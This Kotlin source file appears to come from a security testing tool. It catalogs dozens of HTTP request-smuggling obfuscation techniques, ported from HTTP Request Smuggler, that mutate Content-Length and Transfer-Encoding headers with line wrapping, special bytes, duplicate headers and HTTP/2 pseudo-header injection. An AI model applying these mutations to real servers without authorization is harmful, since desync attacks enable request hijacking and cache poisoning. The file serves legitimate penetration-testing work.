package io.bitbytelab.raijin.turbo

import java.io.ByteArrayOutputStream
import java.util.Base64

/**
 * HTTP request-smuggling / desync obfuscation technique catalog — pure byte/string mutation of
 * a request's Content-Length/Transfer-Encoding header, with no socket/timing coupling. Ported
 * from HTTP Request Smuggler's `DesyncBox.applyDesync()` (same technique names and semantics,
 * read from its actual source — not re-derived from a description). Exposed to Jython Turbo
 * scripts as `turbo.DesyncTechniques` (see [TurboPython.types]), so scripts combine it with the
 * engine's own `pauseBefore`/`pauseTime` partial-send timing — which Raijin's Turbo engine
 * already provides and this deliberately does not duplicate.
 */
object DesyncTechniques {

    /** Special byte values the upstream tool historically found useful for header obfuscation. */
    val SPECIAL_CHARS: List<Int> = listOf(0, 9, 11, 12, 13, 127)

    /** Fixed (non-parameterized) technique names usable against either target header. */
    val SHARED_TECHNIQUES: List<String> = listOf(
        "vanilla", "underjoin1", "spacejoin1", "space1", "nameprefix1", "nameprefix2", "valueprefix1",
        "vertwrap", "connection", "spjunk", "backslash", "spaceFF", "unispace", "quoted", "aposed",
        "0dsuffix", "tabsuffix", "encode", "accentTE", "removed", "get", "options", "head", "range",
        "qencode", "qencodeutf", "nel", "nbsp", "shy", "shy2",
    )

    /**
     * Transfer-Encoding-specific technique names. Each plays on transfer codings themselves (an
     * `identity` list or duplicate, a truncated or accented `chunked`, Content-Encoding), which
     * Content-Length has no counterpart for, so against Content-Length they have no effect.
     */
    val TE_TECHNIQUES: List<String> = listOf(
        "commaCow", "cowComma", "contentEnc", "dualchunk", "lazygrep", "revdualchunk", "nested", "accentCH",
    )

    /** HTTP/1-specific technique names, usable against either target header. */
    val H1_TECHNIQUES: List<String> = listOf(
        "nospace1", "linewrapped1", "doublewrapped", "gareth1", "badsetupCR", "badsetupLF", "multiCase",
        "tabwrap", "UPPERCASE", "0dwrap", "0dspam", "badwrap", "bodysplit", "h1case", "http1.0",
    )

    /** HTTP/2-specific technique names, usable against either target header. */
    val H2_TECHNIQUES: List<String> = listOf(
        "http2hide", "h2colon", "h2auth", "h2path", "http2case", "h2scheme", "h2name", "h2method",
        "h2space", "h2prefix", "h2CL",
    )

    /** Content-Length-specific technique names. */
    val CL_TECHNIQUES: List<String> = listOf(
        "CL-plus", "CL-minus", "CL-pad", "CL-bigpad", "CL-e", "CL-dec", "CL-commaprefix", "CL-commasuffix",
        "CL-expect", "CL-expect-obfs", "CL-error", "CL-spacepad", "CL-byteranges", "CL-multiform",
        "CL-deleteMaxforward", "CL-gzip10", "CL-dualCL",
    )

    /** Every registered fixed technique name, plus a `base:n` entry per [SPECIAL_CHARS] for the parameterized families. */
    @JvmStatic
    fun allTechniques(): List<String> {
        val parameterized = listOf("spacefix1", "prefix1", "suffix1", "namesuffix1")
            .flatMap { base -> SPECIAL_CHARS.map { "$base:$it" } }
        return SHARED_TECHNIQUES + TE_TECHNIQUES + H1_TECHNIQUES + H2_TECHNIQUES + CL_TECHNIQUES + parameterized
    }

    /** String convenience overload of [apply] (ISO-8859-1), for callers — e.g. Jython scripts — that work with plain text requests rather than byte arrays. */
    @JvmStatic
    fun apply(request: String, header: String, technique: String): String? {
        val result = apply(Utils.stringToBytes(request), header, technique) ?: return null
        return Utils.bytesToString(result)
    }

    /**
     * Applies [technique] to [header] (`"Content-Length"` or `"Transfer-Encoding"`) in [request].
     * Returns the mutated request, or null when [header] is `"Content-Length"` and the technique
     * had no effect (a [TE_TECHNIQUES] entry, or a request it does not match: an ineffective CL
     * technique isn't worth sending; for Transfer-Encoding a no-effect technique is still returned,
     * matching upstream exactly).
     */
    @JvmStatic
    fun apply(request: ByteArray, header: String, technique: String): ByteArray? {
        val headerValue = getHeaderValue(request, header)
        val headerLine = "$header: "
        val value = when (header) {
            "Content-Length" -> getHeaderValue(request, "Content-Length")
            "Transfer-Encoding" -> "chunked"
            else -> throw IllegalArgumentException("Unsupported target header: $header")
        }

        var permuted: String? = null
        var transformed = request

        when (technique) {
            "underjoin1" -> permuted = headerLine.replace("-", "_")
            "spacejoin1" -> permuted = headerLine.replace("-", " ")
            "space1" -> permuted = headerLine.replace(":", " :")
            "nameprefix1" -> permuted = "Foo: bar\r\n $headerLine"
            "nameprefix2" -> permuted = "Foo: bar\r\n\t$headerLine"
            "valueprefix1" -> permuted = "$headerLine "
            "nospace1" -> permuted = headerLine.replace(" ", "")
            "linewrapped1" -> permuted = headerLine.replace(" ", "\n ")
            "doublewrapped" -> permuted = headerLine.replace(" ", "\r\n \r\n ")
            "gareth1" -> permuted = headerLine.replace(":", "\n :")
            "badsetupCR" -> permuted = "Foo: bar\r$headerLine"
            "badsetupLF" -> permuted = "Foo: bar\n$headerLine"
            "vertwrap" -> permuted = "$headerLine\n\u000B"
            "tabwrap" -> permuted = "$headerLine\r\n\t"
            "multiCase" -> permuted = headerLine.uppercase().let { it.take(1).lowercase() + it.drop(1) }
            "UPPERCASE" -> permuted = headerLine.uppercase()
            "0dwrap" -> permuted = "Foo: bar\r\n\r$headerLine"
            "0dspam" -> permuted = headerLine.substring(0, 3) + "\r" + headerLine.substring(3)
            "connection" -> permuted = "Connection: ${headerLine.split(": ")[0]}\r\n$headerLine"
            "spjunk" -> permuted = headerLine.replace(":", " x:") // Amit Klein, "HTTP Request Smuggling in 2020"
            "backslash" -> permuted = headerLine.replace("-", "\\") // Amit Klein, "HTTP Request Smuggling in 2020"
            "nel" -> permuted = headerLine.replace(":", "\u0085:")
            "nbsp" -> permuted = headerLine.replace(":", " :")
            "shy2" -> permuted = headerLine.replace(":", "­:")
            "shy" -> permuted = headerLine.replace("-", "­")
        }
        for (i in SPECIAL_CHARS) {
            when (technique) {
                "spacefix1:$i" -> permuted = headerLine.replace(" ", "") + i.toChar()
                "prefix1:$i" -> permuted = headerLine + i.toChar()
                "namesuffix1:$i" -> permuted = headerLine.replace(":", "${i.toChar()}:")
            }
        }
        if (permuted != null) {
            transformed = replaceAll(request, headerLine, permuted)
        }

        if (technique == "badwrap") {
            transformed = replaceAll(request, headerLine, "X-Blah-Ignore: ")
            transformed = Utils.replaceFirst(transformed, "\r\n", "\r\n $headerLine$headerValue\r\n")
        }
        if (technique == "spaceFF") {
            transformed = replaceAll(request, Utils.stringToBytes(headerLine), Utils.stringToBytes(headerLine.dropLast(1)) + 0xFF.toByte())
        }
        if (technique == "unispace") {
            transformed = replaceAll(request, Utils.stringToBytes(headerLine), Utils.stringToBytes(headerLine.dropLast(1)) + 0xA0.toByte())
        }
        if (technique == "http1.0") {
            transformed = Utils.replaceFirst(transformed, "HTTP/1.1", "HTTP/1.0")
            transformed = Utils.replaceFirst(transformed, "HTTP/2", "HTTP/1.0")
        }

        when (technique) {
            "0dsuffix" -> transformed = replaceAll(request, headerLine + value, headerLine + value + "\r")
            "tabsuffix" -> transformed = replaceAll(request, headerLine + value, headerLine + value + "\t")
            "h2auth" -> transformed = replaceAll(
                request, headerLine + value,
                ":authority: ${getHeaderValue(request, "Host")}:443^~$headerLine$value^~x: x",
            )
            "h2path" -> transformed = replaceAll(
                request, headerLine + value,
                ":path: ${getPath(request)} HTTP/1.1^~$headerLine$value^~x: x",
            )
            "h2scheme" -> transformed = replaceAll(
                request, headerLine + value,
                ":scheme: https://${getHeaderValue(request, "Host")}${getPath(request)} HTTP/1.1^~$headerLine$value^~x: x",
            )
            "h2method" -> transformed = replaceAll(
                request, headerLine + value,
                ":method: POST ${getPath(request)} HTTP/1.1^~$headerLine$value^~x: x",
            )
            "removed" -> transformed = replaceAll(request, headerLine + value, "Nothing-interesting: 1")
            "get" -> transformed = setMethod(request, "GET")
            "options" -> transformed = setMethod(request, "OPTIONS")
            "head" -> transformed = setMethod(request, "HEAD")
            "range" -> transformed = addOrReplaceHeader(request, "Range", "bytes=0-0")
            "CL-byteranges" -> transformed = addOrReplaceHeader(request, "Content-Type", "multipart/byteranges; boundary=${Utils.randomAlphanumeric(10)}")
            "CL-multiform" -> transformed = addOrReplaceHeader(request, "Content-Type", "multipart/form-data; boundary=${Utils.randomAlphanumeric(10)}")
            "CL-deleteMaxforward" -> transformed = addOrReplaceHeader(setMethod(request, "DELETE"), "Max-Forwards", "0")
            "CL-gzip10" -> {
                var t = Utils.replaceFirst(request, "HTTP/1.1", "HTTP/1.0")
                t = Utils.replaceFirst(t, "HTTP/2", "HTTP/1.0")
                transformed = addOrReplaceHeader(t, "Transfer-Encoding", "gzip")
            }
            "h2CL" -> return addOrReplaceHeader(request, "Content-Length", "0") // bypasses the no-effect check below, same as upstream
        }

        for (i in SPECIAL_CHARS) {
            if (technique == "suffix1:$i") {
                transformed = replaceAll(request, headerLine + value, headerLine + value + i.toChar())
            }
        }

        // Phrased in terms of the target header's own name and value, so each works against either
        // header; against Transfer-Encoding every one produces upstream's bytes exactly.
        val target = headerLine + value
        transformed = when (technique) {
            "quoted" -> replaceAll(request, target, "$headerLine\"$value\"")
            "aposed" -> replaceAll(request, target, "$headerLine'$value'")
            "encode" -> replaceAll(request, target, "${percentEncodeAfterHyphen(header)}: $value")
            "accentTE" -> replaceAll(request, Utils.stringToBytes(headerLine), accentFirstE(headerLine))
            "qencode" -> replaceAll(request, target, headerLine + encodedWord("iso-8859-1", value))
            "qencodeutf" -> replaceAll(request, target, headerLine + encodedWord("UTF-8", value))
            "bodysplit" -> {
                var t = replaceAll(request, target, "X: y")
                t = addOrReplaceHeader(t, "Foo", "barzxaazz")
                replaceAll(t, "barzxaazz", "barn\n\n$target")
            }
            "http2hide" -> replaceAll(request, target, "Foo: b^~$target^~x: x")
            "h2colon" -> replaceAll(request, target, "${header}`${value} : $value")
            "http2case" -> {
                // HTTP/2 wants lower-case names: every other name is lowered so that only the target
                // carries an upper-case letter. Upstream lowered the whole request (request line and
                // body too) and then searched for the capitalised name, so it never matched.
                val lowered = lowercaseHeaderNames(request)
                val cased = replaceAll(
                    lowered, "${header.lowercase()}: $value",
                    "x-reject: 1\r\n${header.replaceFirstChar { it.lowercaseChar() }}: $value",
                )
                if (cased.contentEquals(lowered)) request else cased
            }
            "h2name" -> replaceAll(request, target, "${header}`${value}^~xz: x")
            "h2space" -> replaceAll(request, target, "$header $value : $value")
            "h1case" -> replaceAll(request, target, headerLine.uppercase() + value)
            "h2prefix" -> replaceAll(request, target, ":${header.lowercase()}: $value")
            else -> transformed
        }

        if (header == "Transfer-Encoding") {
            transformed = when (technique) {
                "commaCow" -> replaceAll(request, "Transfer-Encoding: chunked", "Transfer-Encoding: chunked, identity")
                "cowComma" -> replaceAll(request, "Transfer-Encoding: ", "Transfer-Encoding: identity, ")
                "contentEnc" -> replaceAll(request, "Transfer-Encoding: ", "Content-Encoding: ")
                "dualchunk" -> addOrReplaceHeader(request, "Transfer-encoding", "identity")
                "lazygrep" -> replaceAll(request, "Transfer-Encoding: chunked", "Transfer-Encoding: chunk")
                "revdualchunk" -> replaceAll(request, "Transfer-Encoding: chunked", "Transfer-Encoding: identity\r\nTransfer-Encoding: chunked")
                "nested" -> replaceAll(request, "Transfer-Encoding: chunked", "Transfer-Encoding: identity, chunked, identity")
                "accentCH" -> replaceAll(
                    request, Utils.stringToBytes("Transfer-Encoding: chu"),
                    Utils.stringToBytes("Transfer-Encoding: ch") + 0x96.toByte(),
                )
                else -> transformed
            }
        }

        if (header == "Content-Length") {
            transformed = when (technique) {
                "CL-dualCL" -> replaceAll(request, "Content-Length: $value", "Content-Length: $value\r\nContent-Length: $value")
                "CL-plus" -> replaceAll(request, "Content-Length: ", "Content-Length: +")
                "CL-minus" -> replaceAll(request, "Content-Length: ", "Content-Length: -")
                "CL-pad" -> replaceAll(request, "Content-Length: ", "Content-Length: 0")
                "CL-bigpad" -> replaceAll(request, "Content-Length: ", "Content-Length: 00000000000")
                "CL-spacepad" -> replaceAll(request, "Content-Length: ", "Content-Length: 0 ")
                "CL-e" -> replaceAll(request, "Content-Length: $value", "Content-Length: ${value}e0")
                "CL-dec" -> replaceAll(request, "Content-Length: $value", "Content-Length: $value.0")
                "CL-commaprefix" -> replaceAll(request, "Content-Length: ", "Content-Length: 0, ")
                "CL-commasuffix" -> replaceAll(request, "Content-Length: $value", "Content-Length: $value, 0")
                "CL-expect" -> addOrReplaceHeader(request, "Expect", "100-continue")
                "CL-expect-obfs" -> addOrReplaceHeader(request, "Expect", "x 100-continue")
                "CL-error" -> replaceAll(request, "Content-Length: $value", "X-Invalid Y: \r\nContent-Length: $value")
                else -> transformed
            }
        }

        if (transformed.contentEquals(request) && technique != "vanilla") {
            if (header == "Content-Length") return null
            Utils.err("Requested desync technique had no effect: $technique")
        }
        return transformed
    }

    // --- byte/string helpers below: pure, no Montoya dependency. Built on turbo.Utils's existing
    // ISO-8859-1 byte<->string conversion and indexOf (already exposed to Jython and unit-tested
    // there) rather than re-deriving the upstream Utilities class's exact byte-offset arithmetic. ---

    private fun replaceAll(request: ByteArray, find: ByteArray, replace: ByteArray): ByteArray {
        if (find.isEmpty()) return request
        val starts = mutableListOf<Int>()
        var pos = 0
        while (true) {
            val idx = Utils.indexOf(request, find, pos, request.size)
            if (idx < 0) break
            starts.add(idx)
            pos = idx + find.size
        }
        if (starts.isEmpty()) return request
        val out = ByteArrayOutputStream()
        var prev = 0
        for (s in starts) {
            out.write(request, prev, s - prev)
            out.write(replace)
            prev = s + find.size
        }
        out.write(request, prev, request.size - prev)
        return out.toByteArray()
    }

    private fun replaceAll(request: ByteArray, find: String, replace: String): ByteArray =
        replaceAll(request, Utils.stringToBytes(find), Utils.stringToBytes(replace))

    /** The value of header [headerName] ("Name: value" line, case-sensitive exact name match), or "" if absent. */
    private fun getHeaderValue(request: ByteArray, headerName: String): String {
        val text = Utils.bytesToString(request)
        val headerEnd = text.indexOf("\r\n\r\n").let { if (it < 0) text.length else it }
        val prefix = "$headerName: "
        for (line in text.substring(0, headerEnd).split("\r\n").drop(1)) {
            if (line.startsWith(prefix)) return line.substring(prefix.length)
        }
        return ""
    }

    /** Replaces an existing header's value in place, or inserts a new "Name: value" line at the end of the headers. */
    private fun addOrReplaceHeader(request: ByteArray, headerName: String, value: String): ByteArray {
        val text = Utils.bytesToString(request)
        val headerEndIdx = text.indexOf("\r\n\r\n")
        val headerPart = if (headerEndIdx >= 0) text.substring(0, headerEndIdx) else text
        val bodyPart = if (headerEndIdx >= 0) text.substring(headerEndIdx) else "\r\n\r\n"
        val lines = headerPart.split("\r\n").toMutableList()
        val prefix = "$headerName: "
        val existingIdx = lines.drop(1).indexOfFirst { it.startsWith(prefix) }
        if (existingIdx >= 0) lines[existingIdx + 1] = "$prefix$value" else lines.add("$prefix$value")
        return Utils.stringToBytes(lines.joinToString("\r\n") + bodyPart)
    }

    /** Replaces the request line's method token (everything before the first space). */
    private fun setMethod(request: ByteArray, newMethod: String): ByteArray {
        val text = Utils.bytesToString(request)
        val spaceIdx = text.indexOf(' ')
        if (spaceIdx < 0) return request
        return Utils.stringToBytes(newMethod + text.substring(spaceIdx))
    }

    /** The request line's path token (between the first and second space). */
    private fun getPath(request: ByteArray): String {
        val text = Utils.bytesToString(request)
        val firstSpace = text.indexOf(' ')
        if (firstSpace < 0) return ""
        val secondSpace = text.indexOf(' ', firstSpace + 1)
        if (secondSpace < 0) return ""
        return text.substring(firstSpace + 1, secondSpace)
    }

    /** Lower-cases every header name, leaving the request line, the values and the body as they were. */
    private fun lowercaseHeaderNames(request: ByteArray): ByteArray {
        val text = Utils.bytesToString(request)
        val headerEnd = text.indexOf("\r\n\r\n").let { if (it < 0) text.length else it }
        val lines = text.substring(0, headerEnd).split("\r\n").mapIndexed { index, line ->
            val colon = line.indexOf(':')
            if (index == 0 || colon < 0) line else line.substring(0, colon).lowercase() + line.substring(colon)
        }
        return Utils.stringToBytes(lines.joinToString("\r\n") + text.substring(headerEnd))
    }

    /** [name] with the letter after its hyphen percent-encoded: `Transfer-%45ncoding`, `Content-%4Cength`. */
    private fun percentEncodeAfterHyphen(name: String): String {
        val at = name.indexOf('-') + 1
        return name.substring(0, at) + "%" + "%02X".format(name[at].code) + name.substring(at + 1)
    }

    /** [headerLine] with its first `e` swapped for byte 0x82 (`é` in code page 437): `Transf\x82r-Encoding: `. */
    private fun accentFirstE(headerLine: String): ByteArray {
        val at = headerLine.indexOf('e')
        return Utils.stringToBytes(headerLine.substring(0, at)) + 0x82.toByte() + Utils.stringToBytes(headerLine.substring(at + 1))
    }

    /** [value] as an RFC 2047 base64 encoded-word: `=?iso-8859-1?B?Y2h1bmtlZA==?=` for `chunked`. */
    private fun encodedWord(charset: String, value: String): String =
        "=?$charset?B?${Base64.getEncoder().encodeToString(Utils.stringToBytes(value))}?="
}
